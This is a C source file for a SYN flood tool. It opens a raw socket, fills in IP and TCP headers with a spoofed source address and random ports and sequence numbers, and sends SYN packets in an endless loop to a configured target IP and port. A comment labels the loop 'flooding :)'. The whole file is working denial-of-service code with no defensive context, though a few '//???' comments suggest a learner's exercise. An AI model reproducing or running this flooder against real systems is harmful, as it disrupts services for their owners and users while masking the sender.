#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdlib.h>

#include "header.h"

#define DEST_PORT 2023		//set the destination port here
#define DEST_IP "192.168.1.236" //set your destination ip here
char dest_ip[] = DEST_IP;

#define SRC_IP "192.168.1.1"

char *build_SYN_packet();

int main(int argc, char *argv[])
{
	//random seed
	srand(time(NULL));

	//build the socket
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	int hincl = 1; /* 1 = on, 0 = off */
	setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if (fd < 0)
	{
		perror("Error creating raw socket ");
		exit(EXIT_FAILURE);
	}


	struct sockaddr_in to;
	memset(&to, '0', sizeof(struct sockaddr_in));
	to.sin_family = AF_INET;
	inet_pton(AF_INET, dest_ip, &(to.sin_addr));
	to.sin_port = htons(DEST_PORT);

	int sizeofpacket = sizeof(struct iphdr) + sizeof(struct tcphdr);

	//flooding :)
	int i = 0;
	while (1)
	{
		//build the packet
		char *packet = build_SYN_packet();

		int n = sendto(fd, packet, sizeofpacket, 0, (struct sockaddr *)&to, sizeof(struct sockaddr));
		if (n < 0)
		{
			perror("Error sending the packet");
			exit(EXIT_FAILURE);
		}

		printf("%d packets sent \r", i);
		free(packet);

		i++;
	}

	return 0;
}

char *build_SYN_packet()
{

	char source_ip[] = SRC_IP;   //???
	u_int16_t SRC_PORT = rand(); //???

	char *packet = malloc(65536 * sizeof(char));
	memset(packet, 0, 65536);

	//IP header pointer
	struct iphdr *iph = (struct iphdr *)packet;

	//TCP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

	//fill the IP header here
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->frag_off = 0;
	iph->ttl = 150;
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr(source_ip);
	iph->daddr = inet_addr(dest_ip);
	iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
	iph->id = 0;

	iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

	//filling the TCP header
	tcph->source = htons(SRC_PORT);
	tcph->dest = htons(DEST_PORT);
	tcph->seq = rand(); //???
	tcph->ack_seq = 0;
	tcph->res1 = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->res2 = 0;
	tcph->window = htons(10);
	tcph->urg_ptr = 0;

	//fill the TCP pseudo header
	struct pseudo_tcp_header psh; //pseudo header

	memset(&psh, 0, sizeof(struct pseudo_tcp_header));

	psh.dest_address = inet_addr(dest_ip);
	psh.source_address = inet_addr(source_ip);
	psh.protocol = 6;
	psh.tcp_length = htons(sizeof(struct tcphdr));
	psh.placeholder = 0;

	//filling the TCP header checksum
	char *checkstr;
	checkstr = malloc(sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr));
	memcpy(checkstr, (char *)&psh, sizeof(struct pseudo_tcp_header));
	memcpy(checkstr + sizeof(struct pseudo_tcp_header), (char *)tcph, sizeof(struct tcphdr));

	tcph->check = checksum((unsigned short *)checkstr, sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr));

	return packet;
}